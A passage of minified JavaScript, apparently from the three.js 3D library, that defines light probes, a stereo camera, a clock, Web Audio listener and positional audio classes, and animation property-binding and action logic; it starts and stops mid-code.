ye(s.r,s.g,s.b),u=Math.sqrt(Math.PI),d=u*Math.sqrt(.75);return i.sh.coefficients[0].copy(l).add(c).multiplyScalar(u),i.sh.coefficients[1].copy(l).sub(c).multiplyScalar(d),i}return n}();kc.prototype.isHemisphereLightProbe=!0;var Mc=function(e){_inherits2(n,hc);var t=_createSuper(n);function n(e){var r,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:1;_classCallCheck2(this,n),r=t.call(this,void 0,i);var a=(new $t).set(e);return r.sh.coefficients[0].set(a.r,a.g,a.b).multiplyScalar(2*Math.sqrt(Math.PI)),r}return n}();Mc.prototype.isAmbientLightProbe=!0;var Bc=new Xe,Ec=new Xe,Tc=new Xe,Pc=function(){function e(){_classCallCheck2(this,e),this.type="StereoCamera",this.aspect=1,this.eyeSep=.064,this.cameraL=new Nn,this.cameraL.layers.enable(1),this.cameraL.matrixAutoUpdate=!1,this.cameraR=new Nn,this.cameraR.layers.enable(2),this.cameraR.matrixAutoUpdate=!1,this._cache={focus:null,fov:null,aspect:null,near:null,far:null,zoom:null,eyeSep:null}}return _createClass2(e,[{key:"update",value:function(e){var t=this._cache;if(t.focus!==e.focus||t.fov!==e.fov||t.aspect!==e.aspect*this.aspect||t.near!==e.near||t.far!==e.far||t.zoom!==e.zoom||t.eyeSep!==this.eyeSep){t.focus=e.focus,t.fov=e.fov,t.aspect=e.aspect*this.aspect,t.near=e.near,t.far=e.far,t.zoom=e.zoom,t.eyeSep=this.eyeSep,Tc.copy(e.projectionMatrix);var n,r,i=t.eyeSep/2,a=i*t.near/t.focus,o=t.near*Math.tan(W*t.fov*.5)/t.zoom;Ec.elements[12]=-i,Bc.elements[12]=i,n=-o*t.aspect+a,r=o*t.aspect+a,Tc.elements[0]=2*t.near/(r-n),Tc.elements[8]=(r+n)/(r-n),this.cameraL.projectionMatrix.copy(Tc),n=-o*t.aspect-a,r=o*t.aspect-a,Tc.elements[0]=2*t.near/(r-n),Tc.elements[8]=(r+n)/(r-n),this.cameraR.projectionMatrix.copy(Tc)}this.cameraL.matrixWorld.copy(e.matrixWorld).multiply(Ec),this.cameraR.matrixWorld.copy(e.matrixWorld).multiply(Bc)}}]),e}(),Ic=function(){function e(){var t=!(0<arguments.length&&void 0!==arguments[0])||arguments[0];_classCallCheck2(this,e),this.autoStart=t,this.startTime=0,this.oldTime=0,this.elapsedTime=0,this.running=!1}return _createClass2(e,[{key:"start",value:function(){this.startTime=Fc(),this.oldTime=this.startTime,this.elapsedTime=0,this.running=!0}},{key:"stop",value:function(){this.getElapsedTime(),this.running=!1,this.autoStart=!1}},{key:"getElapsedTime",value:function(){return this.getDelta(),this.elapsedTime}},{key:"getDelta",value:function(){var e=0;if(this.autoStart&&!this.running)return this.start(),0;if(this.running){var t=Fc();e=(t-this.oldTime)/1e3,this.oldTime=t,this.elapsedTime+=e}return e}}]),e}();function Fc(){return("undefined"==typeof performance?Date:performance).now()}var Lc=new ye,Oc=new ge,Nc=new ye,Dc=new ye,Rc=function(e){_inherits2(n,_t);var t=_createSuper(n);function n(){var e;return _classCallCheck2(this,n),(e=t.call(this)).type="AudioListener",e.context=xc.getContext(),e.gain=e.context.createGain(),e.gain.connect(e.context.destination),e.filter=null,e.timeDelta=0,e._clock=new Ic,e}return _createClass2(n,[{key:"getInput",value:function(){return this.gain}},{key:"removeFilter",value:function(){return null!==this.filter&&(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination),this.gain.connect(this.context.destination),this.filter=null),this}},{key:"getFilter",value:function(){return this.filter}},{key:"setFilter",value:function(e){return null!==this.filter?(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination)):this.gain.disconnect(this.context.destination),this.filter=e,this.gain.connect(this.filter),this.filter.connect(this.context.destination),this}},{key:"getMasterVolume",value:function(){return this.gain.gain.value}},{key:"setMasterVolume",value:function(e){return this.gain.gain.setTargetAtTime(e,this.context.currentTime,.01),this}},{key:"updateMatrixWorld",value:function(e){_get2(_getPrototypeOf(n.prototype),"updateMatrixWorld",this).call(this,e);var t=this.context.listener,r=this.up;if(this.timeDelta=this._clock.getDelta(),this.matrixWorld.decompose(Lc,Oc,Nc),Dc.set(0,0,-1).applyQuaternion(Oc),t.positionX){var i=this.context.currentTime+this.timeDelta;t.positionX.linearRampToValueAtTime(Lc.x,i),t.positionY.linearRampToValueAtTime(Lc.y,i),t.positionZ.linearRampToValueAtTime(Lc.z,i),t.forwardX.linearRampToValueAtTime(Dc.x,i),t.forwardY.linearRampToValueAtTime(Dc.y,i),t.forwardZ.linearRampToValueAtTime(Dc.z,i),t.upX.linearRampToValueAtTime(r.x,i),t.upY.linearRampToValueAtTime(r.y,i),t.upZ.linearRampToValueAtTime(r.z,i)}else t.setPosition(Lc.x,Lc.y,Lc.z),t.setOrientation(Dc.x,Dc.y,Dc.z,r.x,r.y,r.z)}}]),n}(),jc=function(e){_inherits2(n,_t);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this)).type="Audio",r.listener=e,r.context=e.context,r.gain=r.context.createGain(),r.gain.connect(e.getInput()),r.autoplay=!1,r.buffer=null,r.detune=0,r.loop=!1,r.loopStart=0,r.loopEnd=0,r.offset=0,r.duration=void 0,r.playbackRate=1,r.isPlaying=!1,r.hasPlaybackControl=!0,r.source=null,r.sourceType="empty",r._startedAt=0,r._progress=0,r._connected=!1,r.filters=[],r}return _createClass2(n,[{key:"getOutput",value:function(){return this.gain}},{key:"setNodeSource",value:function(e){return this.hasPlaybackControl=!1,this.sourceType="audioNode",this.source=e,this.connect(),this}},{key:"setMediaElementSource",value:function(e){return this.hasPlaybackControl=!1,this.sourceType="mediaNode",this.source=this.context.createMediaElementSource(e),this.connect(),this}},{key:"setMediaStreamSource",value:function(e){return this.hasPlaybackControl=!1,this.sourceType="mediaStreamNode",this.source=this.context.createMediaStreamSource(e),this.connect(),this}},{key:"setBuffer",value:function(e){return this.buffer=e,this.sourceType="buffer",this.autoplay&&this.play(),this}},{key:"play",value:function(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:0;if(!0!==this.isPlaying&&!1!==this.hasPlaybackControl){this._startedAt=this.context.currentTime+e;var t=this.context.createBufferSource();return t.buffer=this.buffer,t.loop=this.loop,t.loopStart=this.loopStart,t.loopEnd=this.loopEnd,t.onended=this.onEnded.bind(this),t.start(this._startedAt,this._progress+this.offset,this.duration),this.isPlaying=!0,this.source=t,this.setDetune(this.detune),this.setPlaybackRate(this.playbackRate),this.connect()}}},{key:"pause",value:function(){if(!1!==this.hasPlaybackControl)return!0===this.isPlaying&&(this._progress+=Math.max(this.context.currentTime-this._startedAt,0)*this.playbackRate,!0===this.loop&&(this._progress=this._progress%(this.duration||this.buffer.duration)),this.source.stop(),this.source.onended=null,this.isPlaying=!1),this}},{key:"stop",value:function(){if(!1!==this.hasPlaybackControl)return this._progress=0,this.source.stop(),this.source.onended=null,this.isPlaying=!1,this}},{key:"connect",value:function(){if(0<this.filters.length){this.source.connect(this.filters[0]);for(var e=1,t=this.filters.length;e<t;e++)this.filters[e-1].connect(this.filters[e]);this.filters[this.filters.length-1].connect(this.getOutput())}else this.source.connect(this.getOutput());return this._connected=!0,this}},{key:"disconnect",value:function(){if(0<this.filters.length){this.source.disconnect(this.filters[0]);for(var e=1,t=this.filters.length;e<t;e++)this.filters[e-1].disconnect(this.filters[e]);this.filters[this.filters.length-1].disconnect(this.getOutput())}else this.source.disconnect(this.getOutput());return this._connected=!1,this}},{key:"getFilters",value:function(){return this.filters}},{key:"setFilters",value:function(e){return e||(e=[]),!0===this._connected?(this.disconnect(),this.filters=e.slice(),this.connect()):this.filters=e.slice(),this}},{key:"setDetune",value:function(e){if(this.detune=e,void 0!==this.source.detune)return!0===this.isPlaying&&this.source.detune.setTargetAtTime(this.detune,this.context.currentTime,.01),this}},{key:"getDetune",value:function(){return this.detune}},{key:"getFilter",value:function(){return this.getFilters()[0]}},{key:"setFilter",value:function(e){return this.setFilters(e?[e]:[])}},{key:"setPlaybackRate",value:function(e){if(!1!==this.hasPlaybackControl)return this.playbackRate=e,!0===this.isPlaying&&this.source.playbackRate.setTargetAtTime(this.playbackRate,this.context.currentTime,.01),this}},{key:"getPlaybackRate",value:function(){return this.playbackRate}},{key:"onEnded",value:function(){this.isPlaying=!1}},{key:"getLoop",value:function(){return!1!==this.hasPlaybackControl&&this.loop}},{key:"setLoop",value:function(e){if(!1!==this.hasPlaybackControl)return this.loop=e,!0===this.isPlaying&&(this.source.loop=this.loop),this}},{key:"setLoopStart",value:function(e){return this.loopStart=e,this}},{key:"setLoopEnd",value:function(e){return this.loopEnd=e,this}},{key:"getVolume",value:function(){return this.gain.gain.value}},{key:"setVolume",value:function(e){return this.gain.gain.setTargetAtTime(e,this.context.currentTime,.01),this}}]),n}(),Uc=new ye,$c=new ge,zc=new ye,Hc=new ye,Vc=function(e){_inherits2(n,jc);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this,e)).panner=r.context.createPanner(),r.panner.panningModel="HRTF",r.panner.connect(r.gain),r}return _createClass2(n,[{key:"getOutput",value:function(){return this.panner}},{key:"getRefDistance",value:function(){return this.panner.refDistance}},{key:"setRefDistance",value:function(e){return this.panner.refDistance=e,this}},{key:"getRolloffFactor",value:function(){return this.panner.rolloffFactor}},{key:"setRolloffFactor",value:function(e){return this.panner.rolloffFactor=e,this}},{key:"getDistanceModel",value:function(){return this.panner.distanceModel}},{key:"setDistanceModel",value:function(e){return this.panner.distanceModel=e,this}},{key:"getMaxDistance",value:function(){return this.panner.maxDistance}},{key:"setMaxDistance",value:function(e){return this.panner.maxDistance=e,this}},{key:"setDirectionalCone",value:function(e,t,n){return this.panner.coneInnerAngle=e,this.panner.coneOuterAngle=t,this.panner.coneOuterGain=n,this}},{key:"updateMatrixWorld",value:function(e){if(_get2(_getPrototypeOf(n.prototype),"updateMatrixWorld",this).call(this,e),!0!==this.hasPlaybackControl||!1!==this.isPlaying){this.matrixWorld.decompose(Uc,$c,zc),Hc.set(0,0,1).applyQuaternion($c);var t=this.panner;if(t.positionX){var r=this.context.currentTime+this.listener.timeDelta;t.positionX.linearRampToValueAtTime(Uc.x,r),t.positionY.linearRampToValueAtTime(Uc.y,r),t.positionZ.linearRampToValueAtTime(Uc.z,r),t.orientationX.linearRampToValueAtTime(Hc.x,r),t.orientationY.linearRampToValueAtTime(Hc.y,r),t.orientationZ.linearRampToValueAtTime(Hc.z,r)}else t.setPosition(Uc.x,Uc.y,Uc.z),t.setOrientation(Hc.x,Hc.y,Hc.z)}}}]),n}(),Qc=function(){function e(t){var n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:2048;_classCallCheck2(this,e),this.analyser=t.context.createAnalyser(),this.analyser.fftSize=n,this.data=new Uint8Array(this.analyser.frequencyBinCount),t.getOutput().connect(this.analyser)}return _createClass2(e,[{key:"getFrequencyData",value:function(){return this.analyser.getByteFrequencyData(this.data),this.data}},{key:"getAverageFrequency",value:function(){for(var e=0,t=this.getFrequencyData(),n=0;n<t.length;n++)e+=t[n];return e/t.length}}]),e}(),Gc=function(){function e(t,n,r){var i,a,o;switch(_classCallCheck2(this,e),this.binding=t,this.valueSize=r,n){case"quaternion":i=this._slerp,a=this._slerpAdditive,o=this._setAdditiveIdentityQuaternion,this.buffer=new Float64Array(6*r),this._workIndex=5;break;case"string":case"bool":i=this._select,a=this._select,o=this._setAdditiveIdentityOther,this.buffer=new Array(5*r);break;default:i=this._lerp,a=this._lerpAdditive,o=this._setAdditiveIdentityNumeric,this.buffer=new Float64Array(5*r)}this._mixBufferRegion=i,this._mixBufferRegionAdditive=a,this._setIdentity=o,this._origIndex=3,this._addIndex=4,this.cumulativeWeight=0,this.cumulativeWeightAdditive=0,this.useCount=0,this.referenceCount=0}return _createClass2(e,[{key:"accumulate",value:function(e,t){var n=this.buffer,r=this.valueSize,i=e*r+r,a=this.cumulativeWeight;if(0===a){for(var o=0;o!==r;++o)n[i+o]=n[o];a=t}else{var s=t/(a+=t);this._mixBufferRegion(n,i,0,s,r)}this.cumulativeWeight=a}},{key:"accumulateAdditive",value:function(e){var t=this.buffer,n=this.valueSize,r=n*this._addIndex;0===this.cumulativeWeightAdditive&&this._setIdentity(),this._mixBufferRegionAdditive(t,r,0,e,n),this.cumulativeWeightAdditive+=e}},{key:"apply",value:function(e){var t=this.valueSize,n=this.buffer,r=e*t+t,i=this.cumulativeWeight,a=this.cumulativeWeightAdditive,o=this.binding;if(this.cumulativeWeight=0,this.cumulativeWeightAdditive=0,i<1){var s=t*this._origIndex;this._mixBufferRegion(n,r,s,1-i,t)}0<a&&this._mixBufferRegionAdditive(n,r,this._addIndex*t,1,t);for(var l=t,c=t+t;l!==c;++l)if(n[l]!==n[l+t]){o.setValue(n,r);break}}},{key:"saveOriginalState",value:function(){var e=this.binding,t=this.buffer,n=this.valueSize,r=n*this._origIndex;e.getValue(t,r);for(var i=n,a=r;i!==a;++i)t[i]=t[r+i%n];this._setIdentity(),this.cumulativeWeight=0,this.cumulativeWeightAdditive=0}},{key:"restoreOriginalState",value:function(){var e=3*this.valueSize;this.binding.setValue(this.buffer,e)}},{key:"_setAdditiveIdentityNumeric",value:function(){for(var e=this._addIndex*this.valueSize,t=e+this.valueSize,n=e;n<t;n++)this.buffer[n]=0}},{key:"_setAdditiveIdentityQuaternion",value:function(){this._setAdditiveIdentityNumeric(),this.buffer[this._addIndex*this.valueSize+3]=1}},{key:"_setAdditiveIdentityOther",value:function(){for(var e=this._origIndex*this.valueSize,t=this._addIndex*this.valueSize,n=0;n<this.valueSize;n++)this.buffer[t+n]=this.buffer[e+n]}},{key:"_select",value:function(e,t,n,r,i){if(.5<=r)for(var a=0;a!==i;++a)e[t+a]=e[n+a]}},{key:"_slerp",value:function(e,t,n,r){ge.slerpFlat(e,t,e,t,e,n,r)}},{key:"_slerpAdditive",value:function(e,t,n,r,i){var a=this._workIndex*i;ge.multiplyQuaternionsFlat(e,a,e,t,e,n),ge.slerpFlat(e,t,e,t,e,a,r)}},{key:"_lerp",value:function(e,t,n,r,i){for(var a=1-r,o=0;o!==i;++o){var s=t+o;e[s]=e[s]*a+e[n+o]*r}}},{key:"_lerpAdditive",value:function(e,t,n,r,i){for(var a=0;a!==i;++a){var o=t+a;e[o]=e[o]+e[n+a]*r}}}]),e}(),Wc="\\[\\]\\.:\\/",Kc=new RegExp("["+Wc+"]","g"),qc="[^"+Wc+"]",Xc="[^"+Wc.replace("\\.","")+"]",Yc=/((?:WC+[\/:])*)/.source.replace("WC",qc),Jc=/(WCOD+)?/.source.replace("WCOD",Xc),Zc=/(?:\.(WC+)(?:\[(.+)\])?)?/.source.replace("WC",qc),eu=/\.(WC+)(?:\[(.+)\])?/.source.replace("WC",qc),tu=new RegExp("^"+Yc+Jc+Zc+eu+"$"),nu=["material","materials","bones"],ru=function(){function e(t,n,r){_classCallCheck2(this,e);var i=r||iu.parseTrackName(n);this._targetGroup=t,this._bindings=t.subscribe_(n,i)}return _createClass2(e,[{key:"getValue",value:function(e,t){this.bind();var n=this._targetGroup.nCachedObjects_,r=this._bindings[n];void 0!==r&&r.getValue(e,t)}},{key:"setValue",value:function(e,t){for(var n=this._bindings,r=this._targetGroup.nCachedObjects_,i=n.length;r!==i;++r)n[r].setValue(e,t)}},{key:"bind",value:function(){for(var e=this._bindings,t=this._targetGroup.nCachedObjects_,n=e.length;t!==n;++t)e[t].bind()}},{key:"unbind",value:function(){for(var e=this._bindings,t=this._targetGroup.nCachedObjects_,n=e.length;t!==n;++t)e[t].unbind()}}]),e}(),iu=function(){function e(t,n,r){_classCallCheck2(this,e),this.path=n,this.parsedPath=r||e.parseTrackName(n),this.node=e.findNode(t,this.parsedPath.nodeName)||t,this.rootNode=t,this.getValue=this._getValue_unbound,this.setValue=this._setValue_unbound}return _createClass2(e,[{key:"_getValue_unavailable",value:function(){}},{key:"_setValue_unavailable",value:function(){}},{key:"_getValue_direct",value:function(e,t){e[t]=this.targetObject[this.propertyName]}},{key:"_getValue_array",value:function(e,t){for(var n=this.resolvedProperty,r=0,i=n.length;r!==i;++r)e[t++]=n[r]}},{key:"_getValue_arrayElement",value:function(e,t){e[t]=this.resolvedProperty[this.propertyIndex]}},{key:"_getValue_toArray",value:function(e,t){this.resolvedProperty.toArray(e,t)}},{key:"_setValue_direct",value:function(e,t){this.targetObject[this.propertyName]=e[t]}},{key:"_setValue_direct_setNeedsUpdate",value:function(e,t){this.targetObject[this.propertyName]=e[t],this.targetObject.needsUpdate=!0}},{key:"_setValue_direct_setMatrixWorldNeedsUpdate",value:function(e,t){this.targetObject[this.propertyName]=e[t],this.targetObject.matrixWorldNeedsUpdate=!0}},{key:"_setValue_array",value:function(e,t){for(var n=this.resolvedProperty,r=0,i=n.length;r!==i;++r)n[r]=e[t++]}},{key:"_setValue_array_setNeedsUpdate",value:function(e,t){for(var n=this.resolvedProperty,r=0,i=n.length;r!==i;++r)n[r]=e[t++];this.targetObject.needsUpdate=!0}},{key:"_setValue_array_setMatrixWorldNeedsUpdate",value:function(e,t){for(var n=this.resolvedProperty,r=0,i=n.length;r!==i;++r)n[r]=e[t++];this.targetObject.matrixWorldNeedsUpdate=!0}},{key:"_setValue_arrayElement",value:function(e,t){this.resolvedProperty[this.propertyIndex]=e[t]}},{key:"_setValue_arrayElement_setNeedsUpdate",value:function(e,t){this.resolvedProperty[this.propertyIndex]=e[t],this.targetObject.needsUpdate=!0}},{key:"_setValue_arrayElement_setMatrixWorldNeedsUpdate",value:function(e,t){this.resolvedProperty[this.propertyIndex]=e[t],this.targetObject.matrixWorldNeedsUpdate=!0}},{key:"_setValue_fromArray",value:function(e,t){this.resolvedProperty.fromArray(e,t)}},{key:"_setValue_fromArray_setNeedsUpdate",value:function(e,t){this.resolvedProperty.fromArray(e,t),this.targetObject.needsUpdate=!0}},{key:"_setValue_fromArray_setMatrixWorldNeedsUpdate",value:function(e,t){this.resolvedProperty.fromArray(e,t),this.targetObject.matrixWorldNeedsUpdate=!0}},{key:"_getValue_unbound",value:function(e,t){this.bind(),this.getValue(e,t)}},{key:"_setValue_unbound",value:function(e,t){this.bind(),this.setValue(e,t)}},{key:"bind",value:function(){var t=this.node,n=this.parsedPath,r=n.objectName,i=n.propertyName,a=n.propertyIndex;if(t||(t=e.findNode(this.rootNode,n.nodeName)||this.rootNode,this.node=t),this.getValue=this._getValue_unavailable,this.setValue=this._setValue_unavailable,t){if(r){var o=n.objectIndex;switch(r){case"materials":if(!t.material)return;if(!t.material.materials)return;t=t.material.materials;break;case"bones":if(!t.skeleton)return;t=t.skeleton.bones;for(var s=0;s<t.length;s++)if(t[s].name===o){o=s;break}break;default:if(void 0===t[r])return;t=t[r]}if(void 0!==o){if(void 0===t[o])return;t=t[o]}}var l=t[i];if(void 0!==l){var c=this.Versioning.None;void 0!==(this.targetObject=t).needsUpdate?c=this.Versioning.NeedsUpdate:void 0!==t.matrixWorldNeedsUpdate&&(c=this.Versioning.MatrixWorldNeedsUpdate);var u=this.BindingType.Direct;if(void 0!==a){if("morphTargetInfluences"===i){if(!t.geometry)return;if(!t.geometry.isBufferGeometry)return;if(!t.geometry.morphAttributes)return;void 0!==t.morphTargetDictionary[a]&&(a=t.morphTargetDictionary[a])}u=this.BindingType.ArrayElement,this.resolvedProperty=l,this.propertyIndex=a}else void 0!==l.fromArray&&void 0!==l.toArray?(u=this.BindingType.HasFromToArray,this.resolvedProperty=l):Array.isArray(l)?(u=this.BindingType.EntireArray,this.resolvedProperty=l):this.propertyName=i;this.getValue=this.GetterByBindingType[u],this.setValue=this.SetterByBindingTypeAndVersioning[u][c]}else n.nodeName}}},{key:"unbind",value:function(){this.node=null,this.getValue=this._getValue_unbound,this.setValue=this._setValue_unbound}}],[{key:"create",value:function(t,n,r){return t&&t.isAnimationObjectGroup?new e.Composite(t,n,r):new e(t,n,r)}},{key:"sanitizeNodeName",value:function(e){return e.replace(/\s/g,"_").replace(Kc,"")}},{key:"parseTrackName",value:function(e){var t=tu.exec(e);if(!t)throw new Error("PropertyBinding: Cannot parse trackName: "+e);var n={nodeName:t[2],objectName:t[3],objectIndex:t[4],propertyName:t[5],propertyIndex:t[6]},r=n.nodeName&&n.nodeName.lastIndexOf(".");if(void 0!==r&&-1!==r){var i=n.nodeName.substring(r+1);-1!==nu.indexOf(i)&&(n.nodeName=n.nodeName.substring(0,r),n.objectName=i)}if(null===n.propertyName||0===n.propertyName.length)throw new Error("PropertyBinding: can not parse propertyName from trackName: "+e);return n}},{key:"findNode",value:function(e,t){if(!t||""===t||"."===t||-1===t||t===e.name||t===e.uuid)return e;if(e.skeleton){var n=e.skeleton.getBoneByName(t);if(void 0!==n)return n}if(e.children){var r=function e(n){for(var r=0;r<n.length;r++){var i=n[r];if(i.name===t||i.uuid===t)return i;var a=e(i.children);if(a)return a}return null}(e.children);if(r)return r}return null}}]),e}();iu.Composite=ru,iu.prototype.BindingType={Direct:0,EntireArray:1,ArrayElement:2,HasFromToArray:3},iu.prototype.Versioning={None:0,NeedsUpdate:1,MatrixWorldNeedsUpdate:2},iu.prototype.GetterByBindingType=[iu.prototype._getValue_direct,iu.prototype._getValue_array,iu.prototype._getValue_arrayElement,iu.prototype._getValue_toArray],iu.prototype.SetterByBindingTypeAndVersioning=[[iu.prototype._setValue_direct,iu.prototype._setValue_direct_setNeedsUpdate,iu.prototype._setValue_direct_setMatrixWorldNeedsUpdate],[iu.prototype._setValue_array,iu.prototype._setValue_array_setNeedsUpdate,iu.prototype._setValue_array_setMatrixWorldNeedsUpdate],[iu.prototype._setValue_arrayElement,iu.prototype._setValue_arrayElement_setNeedsUpdate,iu.prototype._setValue_arrayElement_setMatrixWorldNeedsUpdate],[iu.prototype._setValue_fromArray,iu.prototype._setValue_fromArray_setNeedsUpdate,iu.prototype._setValue_fromArray_setMatrixWorldNeedsUpdate]];var au=function(){function e(){_classCallCheck2(this,e),this.uuid=q(),this._objects=Array.prototype.slice.call(arguments),this.nCachedObjects_=0;var t={};this._indicesByUUID=t;for(var n=0,r=arguments.length;n!==r;++n)t[arguments[n].uuid]=n;this._paths=[],this._parsedPaths=[],this._bindings=[],this._bindingsIndicesByPath={};var i=this;this.stats={objects:{get total(){return i._objects.length},get inUse(){return this.total-i.nCachedObjects_}},get bindingsPerObject(){return i._bindings.length}}}return _createClass2(e,[{key:"add",value:function(){for(var e=this._objects,t=this._indicesByUUID,n=this._paths,r=this._parsedPaths,i=this._bindings,a=i.length,o=e.length,s=this.nCachedObjects_,l=0,c=arguments.length;l!==c;++l){var u=arguments[l],d=u.uuid,p=t[d];if(void 0===p){p=o++,t[d]=p,e.push(u);for(var h=0,f=a;h!==f;++h)i[h].push(new iu(u,n[h],r[h]))}else if(p<s){e[p];var A=--s,m=e[A];e[t[m.uuid]=p]=m,e[t[d]=A]=u;for(var v=0,g=a;v!==g;++v){var y=i[v],b=y[A],_=y[p];y[p]=b,void 0===_&&(_=new iu(u,n[v],r[v])),y[A]=_}}else e[p]}this.nCachedObjects_=s}},{key:"remove",value:function(){for(var e=this._objects,t=this._indicesByUUID,n=this._bindings,r=n.length,i=this.nCachedObjects_,a=0,o=arguments.length;a!==o;++a){var s=arguments[a],l=s.uuid,c=t[l];if(void 0!==c&&i<=c){var u=i++,d=e[u];e[t[d.uuid]=c]=d,e[t[l]=u]=s;for(var p=0,h=r;p!==h;++p){var f=n[p],A=f[u],m=f[c];f[c]=A,f[u]=m}}}this.nCachedObjects_=i}},{key:"uncache",value:function(){for(var e=this._objects,t=this._indicesByUUID,n=this._bindings,r=n.length,i=this.nCachedObjects_,a=e.length,o=0,s=arguments.length;o!==s;++o){var l=arguments[o].uuid,c=t[l];if(void 0!==c)if(delete t[l],c<i){var u=--i,d=e[u],p=--a,h=e[p];e[t[d.uuid]=c]=d,e[t[h.uuid]=u]=h,e.pop();for(var f=0,A=r;f!==A;++f){var m=n[f],v=m[u],g=m[p];m[c]=v,m[u]=g,m.pop()}}else{var y=--a,b=e[y];0<y&&(t[b.uuid]=c),e[c]=b,e.pop();for(var _=0,w=r;_!==w;++_){var C=n[_];C[c]=C[y],C.pop()}}}this.nCachedObjects_=i}},{key:"subscribe_",value:function(e,t){var n=this._bindingsIndicesByPath,r=n[e],i=this._bindings;if(void 0!==r)return i[r];var a=this._paths,o=this._parsedPaths,s=this._objects,l=s.length,c=this.nCachedObjects_,u=new Array(l);r=i.length,n[e]=r,a.push(e),o.push(t),i.push(u);for(var d=c,p=s.length;d!==p;++d){var h=s[d];u[d]=new iu(h,e,t)}return u}},{key:"unsubscribe_",value:function(e){var t=this._bindingsIndicesByPath,n=t[e];if(void 0!==n){var r=this._paths,i=this._parsedPaths,a=this._bindings,o=a.length-1,s=a[o];a[t[e[o]]=n]=s,a.pop(),i[n]=i[o],i.pop(),r[n]=r[o],r.pop()}}}]),e}();au.prototype.isAnimationObjectGroup=!0;var ou=function(){function e(t,n){var r=2<arguments.length&&void 0!==arguments[2]?arguments[2]:null,i=3<arguments.length&&void 0!==arguments[3]?arguments[3]:n.blendMode;_classCallCheck2(this,e),this._mixer=t,this._clip=n,this._localRoot=r,this.blendMode=i;for(var a=n.tracks,o=a.length,s=new Array(o),l={endingStart:2400,endingEnd:2400},c=0;c!==o;++c){var u=a[c].createInterpolant(null);(s[c]=u).settings=l}this._interpolantSettings=l,this._interpolants=s,this._propertyBindings=new Array(o),this._cacheIndex=null,this._byClipCacheIndex=null,this._timeScaleInterpolant=null,this._weightInterpolant=null,this.loop=2201,this._loopCount=-1,this._startTime=null,this.time=0,this.timeScale=1,this._effectiveTimeScale=1,this.weight=1,this._effectiveWeight=1,this.repetitions=1/0,this.paused=!1,this.enabled=!0,this.clampWhenFinished=!1,this.zeroSlopeAtStart=!0,this.zeroSlopeAtEnd=!0}return _createClass2(e,[{key:"play",value:function(){return this._mixer._activateAction(this),this}},{key:"stop",value:function(){return this._mixer._deactivateAction(this),this.reset()}},{key:"reset",value:function(){return this.paused=!1,this.enabled=!0,this.time=0,this._loopCount=-1,this._startTime=null,this.stopFading().stopWarping()}},{key:"isRunning",value:function(){return this.enabled&&!this.paused&&0!==this.timeScale&&null===this._startTime&&this._mixer._isActiveAction(this)}},{key:"isScheduled",value:function(){return this._mixer._isActiveAction(this)}},{key:"startAt",value:function(e){return this._startTime=e,this}},{key:"setLoop",value:function(e,t){return this.loop=e,this.repetitions=t,this}},{key:"setEffectiveWeight",value:function(e){return this.weight=e,this._effectiveWeight=this.enabled?e:0,this.stopFading()}},{key:"getEffectiveWeight",value:function(){return this._effectiveWeight}},{key:"fadeIn",value:function(e){return this._scheduleFading(e,0,1)}},{key:"fadeOut",value:function(e){return this._scheduleFading(e,1,0)}},{key:"crossFadeFrom",value:function(e,t,n){if(e.fadeOut(t),this.fadeIn(t),n){var r=this._clip.duration,i=e._clip.duration,a=i/r,o=r/i;e.warp(1,a,t),this.warp(o,1,t)}return this}},{key:"crossFadeTo",value:function(e,t,n){return e.crossFadeFrom(this,t,n)}},{key:"stopFading",value:function(){var e=this._weightInterpolant;return null!==e&&(this._weightInterpolant=null,this._mixer._takeBackControlInterpolant(e)),this}},{key:"setEffectiveTimeScale",value:function(e){return this.timeScale=e,this._effectiveTimeScale=this.paused?0:e,this.stopWarping()}},{key:"getEffectiveTimeScale",value:function(){return this._effectiveTimeScale}},{key:"setDuration",value:function(e){return this.timeScale=this._clip.duration/e,this.stopWarping()}},{key:"syncWith",value:function(e){return this.time=e.time,this.timeScale=e.timeScale,this.stopWarping()}},{key:"halt",value:function(e){return this.warp(this._effectiveTimeScale,0,e)}},{key:"warp",value:function(e,t,n){var r=this._mixer,i=r.time,a=this.timeScale,o=this._timeScaleInterpolant;null===o&&(o=r._lendControlInterpolant(),this._timeScaleInterpolant=o);var s=o.parameterPositions,l=o.sampleValues;return s[0]=i,s[1]=i+n,l[0]=e/a,l[1]=t/a,this}},{key:"stopWarping",value:function(){var e=this._timeScaleInterpolant;return null!==e&&(this._timeScaleInterpolant=null,this._mixer._takeBackControlInterpolant(e)),this}},{key:"getMixer",value:function(){return this._mixer}},{key:"getClip",value:function(){return this._clip}},{key:"getRoot",value:function(){return this._localRoot||this._mixer._root}},{key:"_update",value:function(e,t,n,r){if(this.enabled){var i=this._startTime;if(null!==i){var a=(e-i)*n;if(a<0||0===n)return;this._startTime=null,t=n*a}t*=this._updateTimeScale(e);var o=this._updateTime(t),s=this._updateWeight(e);if(0<s){var l=this._interpolants,c=this._propertyBindings;switch(this.blendMode){case 2501:for(var u=0,d=l.length;u!==d;++u)l[u].evaluate(o),c[u].accumulateAdditive(s);break;case 2500:default:for(var p=0,h=l.length;p!==h;++p)l[p].evaluate(o),c[p].accumulate(r,s)}}}else this._updateWeight(e)}},{key:"_updateWeight",value:function(e){var t=0;if(this.enabled){t=this.weight;var n=this._weightInterpolant;if(null!==n){var r=n.evaluate(e)[0];t*=r,e>n.parameterPositions[1]&&(this.stopFading(),0===r&&(this.enabled=!1))}}return this._effectiveWeight=t}},{key:"_updateTimeScale",value:function(e){var t=0;if(!this.paused){t=this.timeScale;var n=this._timeScaleInterpolant;null!==n&&(t*=n.evaluate(e)[0],e>n.parameterPositions[1]&&(this.stopWarping(),0===t?this.paused=!0:this.timeScale=t))}return this._effectiveTimeScale=t}},{key:"_updateTime",value:function(e){var t=this._clip.duration,n=this.loop,r=this.time+e,i=this._loopCount,a=2202===n;if(0===e)return-1===i?r:a&&1==(1&i)?t-r:r;if(2200===n){-1===i&&(this._loopCount=0,this._setEndings(!0,!0,!1));e:{if(t<=r)r=t;else{if(!(r<0)){this.time=r;break 